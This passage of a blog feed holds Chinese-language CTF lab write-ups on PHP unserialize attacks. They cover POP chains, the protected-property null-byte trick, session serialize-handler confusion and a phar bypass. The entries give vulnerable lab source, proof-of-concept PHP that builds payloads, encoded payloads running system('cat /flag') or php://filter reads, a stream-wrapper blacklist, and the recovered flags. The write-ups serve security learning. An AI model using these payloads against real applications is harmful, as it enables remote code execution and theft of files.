class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$show</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//echo serialize(new Show($show));</span></span><br><span class="line"><span class="comment">//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;s:9:&quot;index.php&quot;;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot; * var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$show</span>)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>传入payload，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Show::__wakeup</span><br><span class="line">Show::__wakeup</span><br><span class="line">Show::__toString</span><br><span class="line">Test::__get</span><br><span class="line">Modifier::__invoke</span><br><span class="line">Modifier::append</span><br><span class="line">U29uZGVyezEzNWQ3OS1iYTYzMWY2NTIwMGE1Zi04NzAyMjUyMzI4NzEtN2FmMWU3NDB9Cg==</span><br></pre></td></tr></table></figure><ol><li><p>unserialize 找 <code>__wakeup()</code>、<code>__destruct()</code></p></li><li><p>在show类中有 <code>__wakeup()</code>方法，其中有$this-&gt;source，当$source为 Show 对象时会先执行<code>__construct()</code>，当执行<code>__toString()</code> 方法，其中 $source 和 $str都是可控的;</p></li><li><p><code>__toString()</code>方法指向$this-&gt;str-&gt;source，会发现没有source方法，但是在Test类中找到了<code>__get()</code>方法，其中$p可控，并且return $function()，会触发<code>__invoke()</code>方法;</p></li><li><p>Modifier类中找到<code>__invoke()</code>方法，指向append方法，会执行include()就可以用php伪协议读文件;</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo3&quot;&gt;&lt;a href=&quot;#serDemo3&quot; class=&quot;headerlink&quot; title=&quot;serDemo3&quot;&gt;&lt;/a&gt;serDemo3&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="pop链" scheme="http://example.com/tags/pop%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>serDemo2 pop链</title>
    <link href="http://example.com/2023/12/22/serDemo2/"/>
    <id>http://example.com/2023/12/22/serDemo2/</id>
    <published>2023-12-22T13:13:24.000Z</published>
    <updated>2024-02-29T12:16:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="serDemo2-pop链"><a href="#serDemo2-pop链" class="headerlink" title="serDemo2 pop链"></a>serDemo2 pop链</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;varr)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件&quot;</span> . <span class="variable language_">$this</span>-&gt;varr . <span class="string">&quot;存在&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>       </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;varr = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title function_ invoke__">test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//     public $varr=&quot;system(&#x27;ls /&#x27;);&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$T1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test1</span>();</span><br><span class="line"><span class="comment">//var_dump($T1);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$T1</span>));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A5%3A%22test1%22%3A1%3A%7Bs%3A4%3A%22varr%22%3BO%3A5%3A%22test2%22%3A2%3A%7Bs%3A4%3A%22varr%22%3Bs%3A6%3A%22123456%22%3Bs%3A3%3A%22obj%22%3BO%3A5%3A%22test3%22%3A1%3A%7Bs%3A4%3A%22varr%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><p>传入<code>payload</code>，得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test1::__destruct</span><br><span class="line">test2::__toString</span><br><span class="line">test3::execute</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br><span class="line">test2::__destruct</span><br><span class="line">test3::__destruct</span><br></pre></td></tr></table></figure><ol><li>看到<code>unserialize</code> 找 <code>__wakeup()</code>、<code>__destruct()</code>，在test1类中有 <code>__destruct()</code> 方法，其中会先判断file_exists();</li><li>如果file_exists()的值为对象时，会执行<code>__toString()</code>方法，并且$varr 是可控的，搜索<code>__toString()</code>方法 在 test2 中有<code>__toString()</code>方法;</li><li>其中又指向<code>$this-&gt;obj-&gt;execute()</code>查找execute()方法,并且<code>$varr</code>和<code>$obj</code>;是可控的查找execute()方法,参数直接执行eval(),在 test3中有execute()方法,并且<code>$varr</code>是可控的.</li><li><code>unserialize -&gt; file_exists() [test1] -&gt; __destruct() [test1] -&gt; toString [test2] -&gt; $this-&gt;obj-&gt;execute() [test3]</code></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;serDemo2-pop链&quot;&gt;&lt;a href=&quot;#serDemo2-pop链&quot; class=&quot;headerlink&quot; title=&quot;serDemo2 pop链&quot;&gt;&lt;/a&gt;serDemo2 pop链&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="pop链" scheme="http://example.com/tags/pop%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>serDemo1 保护属性反序列化</title>
    <link href="http://example.com/2023/12/22/serDemo1/"/>
    <id>http://example.com/2023/12/22/serDemo1/</id>
    <published>2023-12-22T13:13:23.000Z</published>
    <updated>2024-02-29T12:15:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// password in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&quot;\\&quot;</span>) === <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strchr</span>(<span class="variable">$this</span>-&gt;file, <span class="string">&#x27;/&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$filename</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;错误的文件名\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Sonder&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Happy</span> = <span class="keyword">new</span> <span class="title function_ invoke__">happy</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">//echo serialize($Happy);</span></span><br><span class="line"><span class="comment">//O:5:&quot;happy&quot;:1:&#123;s:7:&quot; * file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">//O:5:&quot;happy&quot;:1:&#123;s:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125; \00为空字符</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;O:5:&quot;happy&quot;:2:&#123;s:7:&quot;&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tzo1OiJoYXBweSI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</span><br></pre></td></tr></table></figure><p>传入<code>payload</code>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">happy::__destruct</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>unserialize</code>  先找找看有无 <code>__wakeup()</code>  ，<code>__destruct()</code>，无论代码多么复杂，这是pop链的入口</p></li><li><p><code>happy</code> 类中还有 <code>__wakeup()</code> 方法会将<code>$file</code>的值改变，在<code>unserialize</code> 时会先执行<code>__wakeup()</code>，因此要想办法绕过<code>__wakeup()</code></p></li></ol><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p><strong>protected</strong>属性在序列化过后参数前面的标识符为<code>\00*\00</code> (<code>\00</code>为空字符)， 但是直接用<code>\00</code>的时候不能成功输出 ，使用<code>chr(0)</code>来拼接代替</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="保护属性反序列化" scheme="http://example.com/tags/%E4%BF%9D%E6%8A%A4%E5%B1%9E%E6%80%A7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>serVuln13 引用和session</title>
    <link href="http://example.com/2023/12/22/serVuln12/"/>
    <id>http://example.com/2023/12/22/serVuln12/</id>
    <published>2023-12-22T13:12:23.000Z</published>
    <updated>2024-02-29T12:14:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pisces</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$romance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fantasy</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fantasy = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;romance === <span class="variable language_">$this</span>-&gt;fantasy) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>查看提示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Pisces&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;Pisces&#x27;</span>] = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Pisces&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;系统检测发现该处漏洞，进行攻击测试\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pisces</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$romance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fantasy</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pisces</span> = <span class="keyword">new</span> <span class="title class_">Pisces</span>();</span><br><span class="line"><span class="variable">$pisces</span>-&gt;romance = &amp;<span class="variable">$pisces</span>-&gt;fantasy;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pisces</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/post/session.php?Pisces=|O:6:&quot;Pisces&quot;:2:&#123;s:7:&quot;romance&quot;;N;s:7:&quot;fantasy&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.php传参后返回首页，session处理器会反序列化`|`后的内容，触发wakup</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pisces::__wakeup</span><br><span class="line">Sonder&#123;135d79-ba631f65200a5f-870225232871-7af1e740&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/shiyizhesonder/sonder39/nfvx411pp209arek">https://www.yuque.com/shiyizhesonder/sonder39/nfvx411pp209arek</a></p><p><a href="https://www.yuque.com/shiyizhesonder/sonder39/awxqal5aynlm14p2">https://www.yuque.com/shiyizhesonder/sonder39/awxqal5aynlm14p2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;源码&quot;&gt;&lt;a href=&quot;#源码&quot; class=&quot;headerlink&quot; title=&quot;源码&quot;&gt;&lt;/a&gt;源码&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="PHP反序列化" scheme="http://example.com/categories/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="引用和session" scheme="http://example.com/tags/%E5%BC%95%E7%94%A8%E5%92%8Csession/"/>
    
  </entry>
  
  <entry>
    <title>serVuln11 a phar trick</title>
    <link href="http://example.com/2023/12/22/serVuln11/"/>
    <id>http://example.com/2023/12/22/serVuln11/</id>
    <published>2023-12-22T13:11:23.000Z</published>
    <updated>2024-02-29T12:14:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aquarius</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mark</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$black_list</span> = [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;https&#x27;</span>, <span class="string">&#x27;ftps&#x27;</span>, <span class="string">&#x27;phar&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="keyword">__METHOD__</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="variable">$front</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>, <span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$item</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$front</span> == <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="variable">$mark</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$mark</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Aquarius&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Aquarius&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">Check</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        